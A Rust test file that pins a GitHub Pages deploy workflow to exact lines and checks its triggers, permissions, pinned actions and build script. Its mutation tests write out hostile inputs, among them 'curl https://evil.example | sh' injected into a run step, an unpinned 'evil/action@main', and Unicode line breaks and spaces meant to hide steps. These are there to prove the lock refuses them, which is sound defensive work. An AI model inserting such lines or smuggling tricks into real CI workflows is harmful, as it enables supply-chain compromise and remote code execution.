//! E-GHFLOW2.W8: the Pages workflow's contract - what starts it, what each job may touch, that the
//! build job runs main's builder on git data with a read token and the deploy job runs no repository
//! code. Read line by line, like `keel_gate.rs` reads keel-gate.yml; `locked` holds the file to the
//! exact lines those readers understand.
compiled!();

use crate::keel_gate::{block, job, jobs, read};

fn yml() -> String {
    read(".github/workflows/pages.yml")
}

/// The pinned actions besides checkout, whose pin dist-workspace.toml holds; each pin is written once.
const UPLOAD: &str = "actions/upload-pages-artifact@fc324d3547104276b827a68afc52ff2a11cc49c9";
const DEPLOY: &str = "actions/deploy-pages@368f82528645a54fb793d4d04e342629a3f51346";

fn checkout() -> String {
    let dist: toml::Table = read("dist-workspace.toml").parse().unwrap();
    format!("actions/checkout@{}", dist["dist"]["github-action-commits"]["actions/checkout"].as_str().unwrap())
}

/// Every line of pages.yml that is not blank or a whole-line comment, in order, each exactly as
/// written. The readers below go line by line; this is what makes that sound (code review 2): any
/// other line - a plain scalar's continuation, an anchor or alias, a flow mapping, a quoted or
/// escaped key, an unlisted key at any level (env, defaults, container, services), a trailing
/// comment, a CR inside a line - is refused, never parsed. A comment line at any column is dropped
/// first, so a comment can neither hide a step from the readers nor fail the lock. Only printable
/// ASCII and '\n' are let in, so a line here is a line to YAML and a space is a space.
const LOCK: &str = r#"name: Pages
on:
  workflow_run:
    workflows:
      - Keel gate
    types:
      - completed
permissions: {}
concurrency:
  group: pages
  cancel-in-progress: false
jobs:
  build:
    if: github.event.workflow_run.head_repository.full_name == github.repository
    runs-on: ubuntu-24.04
    timeout-minutes: 10
    permissions:
      contents: read
    steps:
      - uses: {checkout}
        with:
          ref: main
          fetch-depth: 0
          persist-credentials: false
      - run: scripts/pages-build.sh "$RUNNER_TEMP/site"
      - uses: {upload}
        with:
          path: ${{ runner.temp }}/site
  deploy:
    needs: build
    runs-on: ubuntu-24.04
    timeout-minutes: 15
    permissions:
      pages: write
      id-token: write
    environment:
      name: github-pages
      url: ${{ steps.deployment.outputs.page_url }}
    steps:
      - id: deployment
        uses: {deploy}"#;

/// `Err` naming the first line where `y`'s code lines leave `LOCK`, or a missing or extra line.
fn locked(y: &str) -> Result<(), String> {
    let want = LOCK.replace("{checkout}", &checkout()).replace("{upload}", UPLOAD).replace("{deploy}", DEPLOY);
    // code review 3: every byte is printable ASCII or '\n' before a line is judged, so no other line
    // break (CR, NEL, LS, PS), tab, BOM or Unicode space can make a line YAML reads differently from
    // the one this compares; then a blank line is all spaces and a comment line is spaces, then '#'
    if let Some((at, c)) = y.char_indices().find(|&(_, c)| c != '\n' && !(' '..='~').contains(&c)) {
        return Err(format!("byte {at}: {c:?} is not printable ASCII or a newline"));
    }
    let got: Vec<&str> = y.split('\n').filter(|l| !l.bytes().all(|b| b == b' ') && !l.trim_start_matches(' ').starts_with('#')).collect();
    let want: Vec<&str> = want.lines().collect();
    for i in 0..got.len().max(want.len()) {
        if got.get(i) != want.get(i) {
            return Err(format!("line {}: got {:?}, want {:?}", i + 1, got.get(i), want.get(i)));
        }
    }
    Ok(())
}

#[test]
fn the_workflow_is_exactly_the_locked_lines() {
    assert_eq!(locked(&yml()), Ok(()));
}

/// pages.yml with `add` put after its line `after` (which must be there once), or `after` replaced
/// by `add` when `replace`.
fn mutated(after: &str, add: &str, replace: bool) -> String {
    let y = yml();
    assert_eq!(y.lines().filter(|l| *l == after).count(), 1, "{after:?} is one line of pages.yml");
    y.lines()
        .flat_map(|l| {
            if l != after {
                vec![l.to_string()]
            } else if replace {
                vec![add.to_string()]
            } else {
                vec![l.to_string(), add.to_string()]
            }
        })
        .collect::<Vec<_>>()
        .join("\n")
        + "\n"
}

/// Each mutation class code review 2 found passing the line readers is refused by the lock; a comment
/// at any column, alone, is not.
#[test]
fn the_lock_refuses_every_layout_the_line_readers_would_misread() {
    let run = r#"      - run: scripts/pages-build.sh "$RUNNER_TEMP/site""#;
    let deploy_end = format!("        uses: {DEPLOY}");
    let co = format!("      - uses: {}", checkout());
    let refused: Vec<(&str, String)> = vec![
        ("a plain scalar's continuation line under build's run", mutated(run, "        ; curl https://evil.example | sh", false)),
        ("an anchor on build's step", mutated(run, &run.replace("- run:", "- &b run:"), true)),
        ("an alias reusing a build step in deploy", mutated(&deploy_end, "      - *b", false)),
        ("an anchor on the checkout step", mutated(&co, &co.replace("- uses:", "- &co uses:"), true)),
        ("a flow-mapping step in deploy", mutated(&deploy_end, "      - {uses: ./local-action}", false)),
        ("a flow-mapping run in deploy", mutated(&deploy_end, "      - {run: curl x}", false)),
        ("a quoted uses key in deploy", mutated(&deploy_end, "      - name: x\n        \"uses\": docker://alpine", false)),
        ("an escaped run key in deploy", mutated(&deploy_end, "      - name: x\n        \"\\x72un\": curl x", false)),
        ("a run after - name: in deploy", mutated(&deploy_end, "      - name: x\n        run: curl x", false)),
        ("a step after a column-0 comment in build", mutated("          persist-credentials: false", "# note\n      - run: curl x", false)),
        ("an unpinned action after a comment in build", mutated("          persist-credentials: false", "  # note\n      - uses: evil/action@main", false)),
        ("a permission after a comment in build", mutated("      contents: read", "  # note\n      pages: write", false)),
        ("a top-level env", mutated("permissions: {}", "env:\n  BASH_ENV: x", false)),
        ("a top-level defaults", mutated("permissions: {}", "defaults:\n  run:\n    shell: perl {0}", false)),
        ("a container on deploy", mutated("    timeout-minutes: 15", "    container: alpine", false)),
        ("services on deploy", mutated("    timeout-minutes: 15", "    services:\n      x:\n        image: y", false)),
        ("an env on deploy", mutated("    timeout-minutes: 15", "    env:\n      A: b", false)),
        ("a trailing comment", mutated("    timeout-minutes: 15", "    timeout-minutes: 15 # x", true)),
        ("a CR inside a line", mutated("    timeout-minutes: 15", "    timeout-minutes: 15\r    env: {A: b}", true)),
        ("a third job", format!("{}  pages2:\n    runs-on: ubuntu-24.04\n", yml())),
        ("a second document", format!("{}---\nname: x\n", yml())),
        // code review 3: a line break str::lines does not split on, or a space trim drops and YAML keeps
        ("a lone CR after a comment", mutated("          persist-credentials: false", "      # note\r      - uses: evil/action@main", false)),
        ("a NEL after a comment", mutated("          persist-credentials: false", "      # note\u{85}      - uses: evil/action@main", false)),
        ("an LS after a comment", mutated("          persist-credentials: false", "      # note\u{2028}      - uses: evil/action@main", false)),
        ("a PS after a comment", mutated("          persist-credentials: false", "      # note\u{2029}      - uses: evil/action@main", false)),
        ("an NBSP-then-# line under build's run", mutated(run, "          \u{a0}#|| curl https://evil.example | sh", false)),
        ("a U+3000 'blank' line in the environment", mutated("      name: github-pages", "        \u{3000}", false)),
        ("a tab-indented comment", mutated("    timeout-minutes: 15", "\t# note", false)),
        ("a tab-only line", mutated("    timeout-minutes: 15", "\t", false)),
        ("a BOM", format!("\u{feff}{}", yml())),
        ("CRLF line ends", yml().replace('\n', "\r\n")),
    ];
    for (what, y) in &refused {
        assert!(locked(y).is_err(), "{what} passed the lock:\n{y}");
    }
    for (what, y) in [
        ("a column-0 comment in a job", mutated("          persist-credentials: false", "# note", false)),
        ("an indented comment in deploy", mutated("    timeout-minutes: 15", "      # note", false)),
        ("a blank line", mutated("    timeout-minutes: 15", "", false)),
    ] {
        assert_eq!(locked(&y), Ok(()), "{what}");
    }
}

/// The workflow's lines that are not comments, so a word in the header comment proves nothing.
fn code(y: &str) -> Vec<&str> {
    y.lines().filter(|l| !l.trim_start().starts_with('#')).collect()
}

#[test]
fn it_runs_only_after_a_keel_gate_run_ends_never_on_a_push_a_pull_request_or_by_hand() {
    let y = yml();
    assert_eq!(block(&y, "on"), ["  workflow_run:", "    workflows:", "      - Keel gate", "    types:", "      - completed"]);
    let gate_name = read(".github/workflows/keel-gate.yml").lines().find_map(|l| l.strip_prefix("name: ").map(String::from));
    assert_eq!(gate_name.as_deref(), Some("Keel gate"), "the workflow it follows keeps that name");
    for never in
        ["push", "pull_request", "pull_request_target", "pull_request_review", "workflow_dispatch", "issue_comment", "schedule", "tags", "branches", "release"]
    {
        assert!(!code(&y).iter().any(|l| l.trim_start().trim_start_matches("- ").starts_with(&format!("{never}:"))), "pages.yml has a {never} key");
    }
}

#[test]
fn the_build_job_reads_with_contents_read_and_only_the_deploy_job_holds_the_pages_token() {
    let y = yml();
    assert!(code(&y).contains(&"permissions: {}"), "nothing by default");
    assert_eq!(y.matches("permissions:").count(), 3, "the top and one per job");
    let perms = |name: &str| -> Vec<String> {
        job(&y, name).into_iter().skip_while(|l| l != "    permissions:").skip(1).take_while(|l| l.starts_with("      ")).collect()
    };
    assert_eq!(perms("build"), ["      contents: read"]);
    assert_eq!(perms("deploy"), ["      pages: write", "      id-token: write"]);
    assert!(!y.contains("secrets."), "no secret");
    assert!(!y.contains("GITHUB_TOKEN") && !y.contains("github.token"), "the token is never handed to a step");
}

/// The commands of every `run:` key in job lines `j` - a step's first key (`- run: x`) or a later one
/// (`run: x` under `- name: y`) - or `Err` naming a line that mentions run in a form this reader does
/// not parse (a flow mapping `- {run: x}`, a quoted key, `run :`). It reads lines, not YAML: an
/// escaped key or a continuation line escapes it, and `locked` is what refuses those.
/// `runs-on:`, the `runner.` context and the fork filter's `event.workflow_run.` are the only other
/// words holding "run" a job may use.
fn runs(j: &[String]) -> Result<Vec<String>, String> {
    let mut out = vec![];
    for l in j {
        let key = l.trim().trim_start_matches("- ").trim_start();
        if let Some(c) = key.strip_prefix("run:") {
            out.push(c.trim().to_string());
        } else if l.replace("runs-on:", "").replace("runner.", "").replace("event.workflow_run.", "").to_ascii_lowercase().contains("run") {
            return Err(l.clone());
        }
    }
    Ok(out)
}

#[test]
fn the_run_reader_sees_a_run_key_wherever_a_step_puts_it() {
    let y = yml();
    assert!(y.trim_end().ends_with(&format!("        uses: {DEPLOY}")), "the deploy job is the file's last block");
    let with = |extra: &str| format!("{}\n{extra}", y.trim_end());
    let cases: [(&str, Result<Vec<String>, String>); 6] = [
        ("      - run: curl x", Ok(vec!["curl x".into()])),
        ("      - name: x\n        run: curl x", Ok(vec!["curl x".into()])),
        ("      - name: x\n        shell: sh\n        run: curl x", Ok(vec!["curl x".into()])),
        ("      - {run: curl x}", Err("      - {run: curl x}".into())),
        ("      - name: x\n        \"run\": curl x", Err("        \"run\": curl x".into())),
        ("      - name: x\n        RUN : curl x", Err("        RUN : curl x".into())),
    ];
    for (extra, want) in cases {
        assert_eq!(runs(&job(&with(extra), "deploy")), want, "{extra:?}");
    }
    assert_eq!(runs(&job(&with("      - name: x\n        run: curl x"), "build")), runs(&job(&y, "build")), "the other job is untouched");
}

#[test]
fn two_jobs_build_runs_main_s_builder_and_deploy_runs_only_the_deploy_action() {
    let y = yml();
    assert_eq!(jobs(&y), ["build", "deploy"]);
    let build = job(&y, "build");
    let deploy = job(&y, "deploy");
    assert_eq!(runs(&build), Ok(vec![r#"scripts/pages-build.sh "$RUNNER_TEMP/site""#.to_string()]));
    assert_eq!(runs(&deploy), Ok(vec![]), "the deploy job runs no command");
    let uses = |j: &[String]| -> Vec<String> { j.iter().filter_map(|l| l.trim().trim_start_matches("- ").strip_prefix("uses: ").map(String::from)).collect() };
    assert_eq!(uses(&build), [checkout(), UPLOAD.to_string()]);
    assert_eq!(uses(&deploy), [DEPLOY], "no checkout: no repository code in the deploy job");
    for u in uses(&build).iter().chain(&uses(&deploy)) {
        let pin = u.split_once('@').unwrap().1;
        assert!(pin.len() == 40 && pin.bytes().all(|b| b.is_ascii_hexdigit()), "{u} is pinned to a 40-hex commit");
    }
    for want in ["          ref: main", "          fetch-depth: 0", "          persist-credentials: false", "          path: ${{ runner.temp }}/site"] {
        assert!(build.iter().any(|l| l == want), "build lacks {want:?}");
    }
    assert!(deploy.iter().any(|l| l == "    needs: build"));
    assert!(deploy.iter().any(|l| l == "      name: github-pages"), "the environment whose rule admits only main");
    for j in ["build", "deploy"] {
        let lines = job(&y, j);
        assert!(lines.iter().any(|l| l == "    runs-on: ubuntu-24.04"), "{j}");
        assert!(lines.iter().any(|l| l.starts_with("    timeout-minutes: ")), "{j}");
        assert!(!lines.iter().any(|l| l.contains("continue-on-error")), "{j}");
    }
}

#[test]
fn no_event_value_reaches_a_step_and_no_cache_is_used() {
    let y = yml();
    let event_lines: Vec<&str> = code(&y).into_iter().filter(|l| l.contains("github.event")).collect();
    assert_eq!(event_lines, ["    if: github.event.workflow_run.head_repository.full_name == github.repository"], "the only event value is the fork filter");
    for l in code(&y).into_iter().filter(|l| l.trim_start().starts_with("- run:") || l.trim_start().starts_with("run:")) {
        assert!(!l.contains("${{"), "an expression in a run line: {l}");
        assert!(!l.trim_end().ends_with('|') && !l.trim_end().ends_with('>'), "no multi-line run block: {l}");
    }
    assert!(!y.contains("cache") && !y.contains("download-artifact") && !y.contains("workflow_run.id"), "nothing from the run that started it, and no cache");
}

#[test]
fn deploys_queue_and_are_never_cancelled() {
    assert_eq!(block(&yml(), "concurrency"), ["  group: pages", "  cancel-in-progress: false"]);
}

#[test]
fn the_builder_is_executable_and_reads_git_data_only() {
    let p = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("scripts/pages-build.sh");
    let mode = std::os::unix::fs::PermissionsExt::mode(&std::fs::metadata(&p).unwrap().permissions());
    assert_eq!(mode & 0o111, 0o111, "the workflow step runs it directly");
    let s = read("scripts/pages-build.sh");
    assert!(s.starts_with("#!/bin/sh\n"));
    for never in ["checkout", "worktree", "cargo", ". ./", "source ", "eval", "sh -c", "tar ", "cp ", "ln "] {
        assert!(!code(&s).iter().any(|l| l.contains(never)), "the builder runs or copies branch content through {never:?}");
    }
    assert_eq!(code(&s).iter().filter(|l| l.contains("git cat-file blob")).count(), 2, "files and the note are written only as blobs");
}
